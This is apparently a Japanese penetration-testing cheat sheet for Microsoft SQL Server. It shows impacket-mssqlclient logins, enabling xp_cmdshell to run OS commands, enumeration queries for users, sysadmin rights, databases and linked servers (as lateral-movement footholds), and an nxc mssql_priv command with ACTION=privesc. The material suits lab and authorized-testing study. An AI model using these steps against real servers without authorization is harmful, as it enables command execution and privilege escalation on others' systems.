
## 1. 接続 (impacket-mssqlclient)

Windows認証（ドメインユーザー）を使用してMSSQLに接続する。

```bash
impacket-mssqlclient -windows-auth 'DOMAIN/user:password'@<Target-IP>
```

SQL Server認証を使用する場合：

```bash
impacket-mssqlclient 'user:password'@<Target-IP>
```

---

## 2. impacket-mssqlclient 内部の対話コマンド

シェル接続後に利用可能な便利な補助コマンド。

| コマンド | 説明 |
| --- | --- |
| `help` | 利用可能なコマンド一覧を表示する |
| `enable_xp_cmdshell` | 無効化されている `xp_cmdshell` を有効化する |
| `xp_cmdshell <command>` | OSコマンドを実行する |
| `exit` | セッションを終了する |

---

## 3. 基本的なSQLクエリ（情報列挙）

### ユーザーと権限の確認

現在のユーザー名と `sysadmin` 権限を持っているかを確認する。

```sql
SELECT SYSTEM_USER;
SELECT IS_SRVROLEMEMBER('sysadmin');
```

### データベースの一覧表示

サーバー上に存在するデータベースの一覧を取得する。

```sql
SELECT name FROM sys.databases;
```

### データベースの選択（切り替え）

操作対象のデータベースを指定する。

```sql
USE <Database_Name>;
```

### テーブルの一覧表示

現在選択しているデータベース内のテーブル一覧を取得する。

```sql
SELECT TABLE_SCHEMA, TABLE_NAME FROM information_schema.tables WHERE TABLE_TYPE = 'BASE TABLE';
```

---

## 4. 便利なクエリ・テクニック

### リンクサーバー（Linked Servers）の確認

信頼されている外部データベースサーバーへのリンクを確認する（横展開の足がかり）。

```sql
SELECT * FROM sys.servers;
```

### 特定テーブルからのデータ抽出

テーブルの中身を確認する。

```sql
SELECT TOP 10 * FROM <Table_Name>;
```

---

## 5. NetExec (nxc) によるMSSQL確認

リモートからMSSQLの権限やインパーソネーション（偽装）可能なユーザーをスキャンする。

```bash
nxc mssql <Target-IP> -u <user> -p <password> -M mssql_priv -o ACTION=privesc
```
